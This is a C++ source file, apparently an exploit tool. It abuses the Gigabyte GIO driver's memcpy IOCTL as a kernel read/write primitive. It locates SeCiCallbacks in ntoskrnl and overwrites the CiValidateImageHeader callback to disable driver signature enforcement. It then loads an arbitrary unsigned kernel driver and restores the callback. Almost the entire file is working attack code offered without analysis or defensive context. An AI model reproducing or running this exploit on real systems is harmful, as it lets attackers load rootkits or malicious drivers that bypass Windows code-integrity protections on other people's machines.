#include "global.h"
#include "hde/hde64.h"
#include <shlwapi.h>
#include <devioctl.h>
#include <Psapi.h>


#define EQUALS(a, b)				(RtlCompareMemory(a, b, sizeof(b) - 1) == (sizeof(b) - 1))
#define NT_MACHINE					L"\\Registry\\Machine\\"
#define SVC_BASE					NT_MACHINE L"System\\CurrentControlSet\\Services\\"

// Gigabyte GIO device name and type, and IOCTL code for memcpy call
#define GIO_DEVICE_NAME				L"\\Device\\GIO"
#define FILE_DEVICE_GIO				(0xc350)
#define IOCTL_GIO_MEMCPY			CTL_CODE(FILE_DEVICE_GIO, 0xa02, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Input struct for IOCTL_GIO_MEMCPY

struct seCiCallbacks_swap
{
	DWORD64 ciValidateImageHeaderEntry;
	DWORD64 zwFlushInstructionCache;
};

typedef struct _GIOMemcpyInput
{
	ULONG64 Dst;
	ULONG64 Src;
	DWORD Size;
} GIOMemcpyInput, *PGIOMemcpyInput;

static WCHAR DriverServiceName[MAX_PATH], LoaderServiceName[MAX_PATH];

static
NTSTATUS
FindKernelModule(
	_In_ PCCH ModuleName,
	_Out_ PULONG_PTR ModuleBase
	)
{
	*ModuleBase = 0;

	ULONG Size = 0;
	NTSTATUS Status;
	if ((Status = NtQuerySystemInformation(SystemModuleInformation, nullptr, 0, &Size)) != STATUS_INFO_LENGTH_MISMATCH)
		return Status;
	
	const PRTL_PROCESS_MODULES Modules = static_cast<PRTL_PROCESS_MODULES>(RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, 2 * static_cast<SIZE_T>(Size)));
	Status = NtQuerySystemInformation(SystemModuleInformation,
										Modules,
										2 * Size,
										nullptr);
	if (!NT_SUCCESS(Status))
		goto Exit;

	for (ULONG i = 0; i < Modules->NumberOfModules; ++i)
	{
		RTL_PROCESS_MODULE_INFORMATION Module = Modules->Modules[i];
		if (_stricmp(ModuleName, reinterpret_cast<PCHAR>(Module.FullPathName) + Module.OffsetToFileName) == 0)
		{
			*ModuleBase = reinterpret_cast<ULONG_PTR>(Module.ImageBase);
			Status = STATUS_SUCCESS;
			break;
		}
	}

Exit:
	RtlFreeHeap(RtlProcessHeap(), 0, Modules);
	return Status;
}

ULONG_PTR GetKernelModuleAddress(const char* name) {

	DWORD size = 0;
	void* buffer = NULL;
	PRTL_PROCESS_MODULES modules;

	NTSTATUS status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, buffer, size, &size);

	while (status == STATUS_INFO_LENGTH_MISMATCH) {
		VirtualFree(buffer, 0, MEM_RELEASE);

		buffer = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, buffer, size, &size);
	}

	if (!NT_SUCCESS(status))
	{
		VirtualFree(buffer, 0, MEM_RELEASE);
		return NULL;
	}

	modules = (PRTL_PROCESS_MODULES)buffer;

	for (int i = 0; i < modules->NumberOfModules; i++)
	{
		char* currentName = (char*)modules->Modules[i].FullPathName + modules->Modules[i].OffsetToFileName;

		if (!_stricmp(currentName, name)) {
			ULONG_PTR result = (ULONG_PTR)modules->Modules[i].ImageBase;

			VirtualFree(buffer, 0, MEM_RELEASE);
			return result;
		}
	}

	VirtualFree(buffer, 0, MEM_RELEASE);
	return NULL;
}


seCiCallbacks_swap getCiValidateImageHeaderEntry()
{
	Printf(L"[!] Searching pattern...\n");
	// Get ntoskrnl base in kernel

	ULONG_PTR kModuleBase = GetKernelModuleAddress("ntoskrnl.exe");
	// Load ntoskrnl.exe into usermode and resolve its base 
	HMODULE uNt = LoadLibraryEx(L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
	DWORD64 uNtAddr = (DWORD64)uNt;
	void* ntoskrnl_ptr = (void*)uNt;

	//Calculating the size of the loaded module
	MODULEINFO modinfo;
	GetModuleInformation(GetCurrentProcess(), uNt, &modinfo, sizeof(modinfo));

	// pattern sigscan for lea r8, [nt!SeCiCallbacks]
	unsigned char pattern[] = { 0xff, 0x48, 0x8b, 0xd3, 0x4c, 0x8d, 0x05 };

	// pattern scanning 
	DWORD64 seCiCallbacksInstr = 0x0;
	for (unsigned int i = 0; i < modinfo.SizeOfImage; i++)
	{

		for (int j = 0; j < sizeof(pattern); j++)
		{
			unsigned char chr = *(char*)(uNtAddr + i + j);
			if (pattern[j] != chr)
			{

				break;
			}
			if (j + 1 == sizeof(pattern))
			{
				seCiCallbacksInstr = uNtAddr + i + 4; // one occurence only 
			}
		}
	}
	if (seCiCallbacksInstr == 0x0)
	{
		Printf(L"[!] Couldnt find lea r8, [nt!SeCiCallbacks]");
	}
	else
	{
		Printf(L"[*] Instr : %p\n", seCiCallbacksInstr);
	}
	DWORD32 seCiCallbacksLeaOffset = *(DWORD32*)(seCiCallbacksInstr + 3);
	//Printf(L"[!] seCiCallbacksLeaOffset : %p\n", seCiCallbacksLeaOffset);
	// The LEA instruction searched for does 32bit math, hence overflow into the more significant 32 bits must be prevented.
	DWORD32 seCiCallbacksInstrLow = (DWORD32)seCiCallbacksInstr;
	DWORD32 seCiCallbacksAddrLow = seCiCallbacksInstrLow + 3 + 4 + seCiCallbacksLeaOffset;
	// calc struct's address in usermode
	DWORD64 seCiCallbacksAddr = (seCiCallbacksInstr & 0xFFFFFFFF00000000) + seCiCallbacksAddrLow;
	Printf(L"[*] usermode CiCallbacks : %p\n", seCiCallbacksAddr);
	// calc offset form base 
	DWORD64 KernelOffset = seCiCallbacksAddr - uNtAddr;
	Printf(L"[*] Offset  : %p\n", KernelOffset);
	// Calc struct address in kernel based on offset 
	DWORD64 kernelAddress = kModuleBase + KernelOffset;
	// Resolving the kernel nt!zwFlushInstructionCache address
	DWORD64 zwFlushInstructionCache = (DWORD64)GetProcAddress(uNt, "ZwFlushInstructionCache") - uNtAddr + (DWORD64)kModuleBase;
	// add hardcoded offset to the SeCiCallbacks struct to get to CiValidateImageHeader's entry 
	DWORD64 ciValidateImageHeaderEntry = kernelAddress + 0x20;

	return seCiCallbacks_swap{
		ciValidateImageHeaderEntry,
		zwFlushInstructionCache
	};
}






static int ConvertToNtPath(PWCHAR Dst, PWCHAR Src) // TODO: holy shit this is fucking horrible
{
	wcscpy_s(Dst, sizeof(L"\\??\\") / sizeof(WCHAR), L"\\??\\");
	wcscat_s(Dst, (MAX_PATH + sizeof(L"\\??\\")) / sizeof(WCHAR), Src);
	return static_cast<int>(wcslen(Dst)) * sizeof(wchar_t) + sizeof(wchar_t);
}

static void FileNameToServiceName(PWCHAR ServiceName, PWCHAR FileName)
{
	int p = sizeof(SVC_BASE) / sizeof(WCHAR) - 1;
	wcscpy_s(ServiceName, sizeof(SVC_BASE) / sizeof(WCHAR), SVC_BASE);
	for (PWCHAR i = FileName; *i; ++i)
	{
		if (*i == L'\\')
			FileName = i + 1;
	}
	while (*FileName != L'\0' && *FileName != L'.')
		ServiceName[p++] = *FileName++;
	ServiceName[p] = L'\0';
}

static NTSTATUS CreateDriverService(PWCHAR ServiceName, PWCHAR FileName)
{
	FileNameToServiceName(ServiceName, FileName);
	NTSTATUS Status = RtlCreateRegistryKey(RTL_REGISTRY_ABSOLUTE, ServiceName);
	if (!NT_SUCCESS(Status))
		return Status;

	WCHAR NtPath[MAX_PATH];
	ULONG ServiceType = SERVICE_KERNEL_DRIVER;

	Status = RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE,
									ServiceName,
									L"ImagePath",
									REG_SZ,
									NtPath,
									ConvertToNtPath(NtPath, FileName));
	if (!NT_SUCCESS(Status))
		return Status;

	Status = RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE,
									ServiceName,
									L"Type",
									REG_DWORD,
									&ServiceType,
									sizeof(ServiceType));
	return Status;
}

static void DeleteService(PWCHAR ServiceName)
{
	// TODO: shlwapi.dll? holy fuck this is horrible
	SHDeleteKeyW(HKEY_LOCAL_MACHINE, ServiceName + sizeof(NT_MACHINE) / sizeof(WCHAR) - 1);
}



static NTSTATUS LoadDriver(PWCHAR ServiceName)
{
	UNICODE_STRING ServiceNameUcs;
	RtlInitUnicodeString(&ServiceNameUcs, ServiceName);
	return NtLoadDriver(&ServiceNameUcs);
}

static NTSTATUS UnloadDriver(PWCHAR ServiceName)
{
	UNICODE_STRING ServiceNameUcs;
	RtlInitUnicodeString(&ServiceNameUcs, ServiceName);
	return NtUnloadDriver(&ServiceNameUcs);
}

static
NTSTATUS
OpenDeviceHandle(
	_Out_ PHANDLE DeviceHandle,
	_In_ BOOLEAN PrintErrors
	)
{
	UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(GIO_DEVICE_NAME);
	OBJECT_ATTRIBUTES ObjectAttributes = RTL_CONSTANT_OBJECT_ATTRIBUTES(&DeviceName, OBJ_CASE_INSENSITIVE);
	IO_STATUS_BLOCK IoStatusBlock;

	const NTSTATUS Status = NtCreateFile(DeviceHandle,
										SYNCHRONIZE, // Yes, these really are the only access rights needed. (actually would be 0, but we want SYNCHRONIZE to wait on NtDeviceIoControlFile)
										&ObjectAttributes,
										&IoStatusBlock,
										nullptr,
										FILE_ATTRIBUTE_NORMAL,
										FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
										FILE_OPEN,
										FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
										nullptr,
										0);

	if (!NT_SUCCESS(Status) && PrintErrors) // The first open is expected to fail; don't spam the user about it
		Printf(L"Failed to obtain handle to device %wZ: NtCreateFile: %08X.\n", &DeviceName, Status);

	return Status;
}


void* mapFileIntoMemory(const char* path) {

	HANDLE fileHandle = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (fileHandle == INVALID_HANDLE_VALUE) {
		return NULL;
	}

	HANDLE fileMapping = CreateFileMapping(fileHandle, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	if (fileMapping == NULL) {
		CloseHandle(fileHandle);
		return NULL;
	}

	void* fileMap = MapViewOfFile(fileMapping, FILE_MAP_READ, 0, 0, 0);
	if (fileMap == NULL) {
		CloseHandle(fileMapping);
		CloseHandle(fileHandle);
	}

	return fileMap;
}

void* signatureSearch(char* base, char* inSig, int length, int maxHuntLength) {
	for (int i = 0; i < maxHuntLength; i++) {
		if (base[i] == inSig[0]) {
			if (memcmp(base + i, inSig, length) == 0) {
				return base + i;
			}
		}
	}

	return NULL;
}

ULONG_PTR signatureSearchInSection(char* section, char* base, char* inSig, int length) {

	IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)base;
	IMAGE_NT_HEADERS64* ntHeaders = (IMAGE_NT_HEADERS64*)((char*)base + dosHeader->e_lfanew);
	IMAGE_SECTION_HEADER* sectionHeaders = (IMAGE_SECTION_HEADER*)((char*)ntHeaders + sizeof(IMAGE_NT_HEADERS64));
	IMAGE_SECTION_HEADER* textSection = NULL;
	ULONG_PTR gadgetSearch = NULL;

	for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
		if (memcmp(sectionHeaders[i].Name, section, strlen(section)) == 0) {
			textSection = &sectionHeaders[i];
			break;
		}
	}

	if (textSection == NULL) {
		return NULL;
	}

	gadgetSearch = (ULONG_PTR)signatureSearch(((char*)base + textSection->VirtualAddress), inSig, length, textSection->SizeOfRawData);

	return gadgetSearch;
}





static
NTSTATUS
TriggerExploit(
	_In_ PWSTR LoaderServiceName,
	_In_ PWSTR DriverServiceName
	)
{


	// First try to open the device without loading the driver. This only works if it was already loaded
	HANDLE DeviceHandle;
	NTSTATUS Status = OpenDeviceHandle(&DeviceHandle, FALSE);
	// if not already loaded 
	if (!NT_SUCCESS(Status))
	{
		// Load the Gigabyte loader driver
		Status = LoadDriver(LoaderServiceName);
		if (!NT_SUCCESS(Status))
		{
			Printf(L"Failed to load driver service %ls. NtLoadDriver: %08X.\n", LoaderServiceName, Status);
			return Status;
		}

		// The device should exist now. If we still can't open it, bail
		Status = OpenDeviceHandle(&DeviceHandle, TRUE);
		if (!NT_SUCCESS(Status))
			return Status;
	}

	// Find where to write 
	seCiCallbacks_swap w = getCiValidateImageHeaderEntry();
	Printf(L"[!] Where: %p\n", w.ciValidateImageHeaderEntry);
	Printf(L"[!] What : %p\n", w.zwFlushInstructionCache);
	
	// Set up read operation to read original callback 
	GIOMemcpyInput MemcpyInputR;
	IO_STATUS_BLOCK IoStatusBlockR;
	DWORD64 dataR = NULL;
	ULONG64 targetR = w.ciValidateImageHeaderEntry;
	MemcpyInputR.Src = targetR;
	MemcpyInputR.Dst = (ULONG64)&dataR;
	MemcpyInputR.Size = 8;
	// Exploit Read primitive 

	RtlZeroMemory(&IoStatusBlockR, sizeof(IoStatusBlockR));
	Status = NtDeviceIoControlFile(DeviceHandle,
		nullptr,
		nullptr,
		nullptr,
		&IoStatusBlockR,
		IOCTL_GIO_MEMCPY,
		&MemcpyInputR,
		sizeof(MemcpyInputR),
		nullptr,
		0);
	if (!NT_SUCCESS(Status))
		Printf(L"NtDeviceIoControlFile(IOCTL_GIO_MEMCPY) *WRITE* failed: error %08X\n", Status);

	Printf(L"[*] Original Callback : %p\n", dataR);
	
	// Set up buffer for write operation 

	
	GIOMemcpyInput MemcpyInput;
	IO_STATUS_BLOCK IoStatusBlock;
	DWORD64 data = w.zwFlushInstructionCache;
	ULONG64 target = w.ciValidateImageHeaderEntry;
	MemcpyInput.Src  = (ULONG64)&data;
	MemcpyInput.Dst  = target;
	MemcpyInput.Size = 8;
	// Exploit write primitive 
	
	RtlZeroMemory(&IoStatusBlock, sizeof(IoStatusBlock));
	Status = NtDeviceIoControlFile(DeviceHandle,
		nullptr,
		nullptr,
		nullptr,
		&IoStatusBlock,
		IOCTL_GIO_MEMCPY,
		&MemcpyInput,
		sizeof(MemcpyInput),
		nullptr,
		0);
	if (!NT_SUCCESS(Status))
		Printf(L"NtDeviceIoControlFile(IOCTL_GIO_MEMCPY) *WRITE* failed: error %08X\n", Status);
	// Load Driver 
		// Load the Gigabyte loader driver
	Status = LoadDriver(DriverServiceName);
	if (!NT_SUCCESS(Status))
	{
		Printf(L"Failed to load driver service %ls. NtLoadDriver: %08X.\n", DriverServiceName, Status);
		return Status;
	}

	// The device should exist now. If we still can't open it, bail
	Status = OpenDeviceHandle(&DeviceHandle, TRUE);
	if (!NT_SUCCESS(Status))
		return Status;
	Printf(L"[*] Successfully Loaded unsigned driver!\n");
		 

	// Restore callback 
	// Set up buffer for write operation 



	target = w.ciValidateImageHeaderEntry;
	MemcpyInput.Src = (ULONG64)&dataR;
	MemcpyInput.Dst = target;
	MemcpyInput.Size = 8;
	// Exploit write primitive 

	RtlZeroMemory(&IoStatusBlock, sizeof(IoStatusBlock));
	Status = NtDeviceIoControlFile(DeviceHandle,
		nullptr,
		nullptr,
		nullptr,
		&IoStatusBlock,
		IOCTL_GIO_MEMCPY,
		&MemcpyInput,
		sizeof(MemcpyInput),
		nullptr,
		0);
	if (!NT_SUCCESS(Status))
		Printf(L"NtDeviceIoControlFile(IOCTL_GIO_MEMCPY) *WRITE* failed: error %08X\n", Status);
	Printf(L"[*] Restored callback \n");
	UnloadDriver(LoaderServiceName);
Exit:
	NtClose(DeviceHandle);

	return Status;
}

NTSTATUS
WindLoadDriver(
	_In_ PWCHAR LoaderName,
	_In_ PWCHAR DriverName,
	_In_ BOOLEAN Hidden
)
{
	WCHAR LoaderPath[MAX_PATH], DriverPath[MAX_PATH];


	// Enable privileges
	CONSTEXPR CONST ULONG SE_LOAD_DRIVER_PRIVILEGE = 10UL;
	BOOLEAN SeLoadDriverWasEnabled;
	NTSTATUS Status = RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE,
		TRUE,
		FALSE,
		&SeLoadDriverWasEnabled);
	if (!NT_SUCCESS(Status))
	{
		Printf(L"Fatal error: failed to acquire SE_LOAD_DRIVER_PRIVILEGE. Make sure you are running as administrator.\n");
		return Status;
	}

	// Expand filenames to full paths
	Status = RtlGetFullPathName_UEx(LoaderName, MAX_PATH * sizeof(WCHAR), LoaderPath, nullptr, nullptr);
	if (!NT_SUCCESS(Status))
		return Status;
	Status = RtlGetFullPathName_UEx(DriverName, MAX_PATH * sizeof(WCHAR), DriverPath, nullptr, nullptr);
	if (!NT_SUCCESS(Status))
		return Status;

	// Create the target driver service
	Status = CreateDriverService(DriverServiceName, DriverPath);
	if (!NT_SUCCESS(Status))
		return Status;

	// Create the loader driver service
	Status = CreateDriverService(LoaderServiceName, LoaderPath);
	if (!NT_SUCCESS(Status))
		return Status;
	// ----------------------------------- works until here -----------------------------
	
	// Call TriggerExploit we need to find the address we want to overwrite, load the vulnerable driver , make it writeable and write to it.
	TriggerExploit(LoaderServiceName,DriverServiceName);

	return Status;
}
NTSTATUS
WindUnloadDriver(
	_In_ PWCHAR DriverName,
	_In_ BOOLEAN Hidden
	)
{
	CONSTEXPR CONST ULONG SE_LOAD_DRIVER_PRIVILEGE = 10UL;
	BOOLEAN SeLoadDriverWasEnabled;
	NTSTATUS Status = RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE,
										TRUE,
										FALSE,
										&SeLoadDriverWasEnabled);
	if (!NT_SUCCESS(Status))
		return Status;

	if (DriverName != nullptr && Hidden)
		CreateDriverService(DriverServiceName, DriverName);

	FileNameToServiceName(DriverServiceName, DriverName);

	Status = UnloadDriver(DriverServiceName);


	RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE,
						SeLoadDriverWasEnabled,
						FALSE,
						&SeLoadDriverWasEnabled);

	return Status;
}
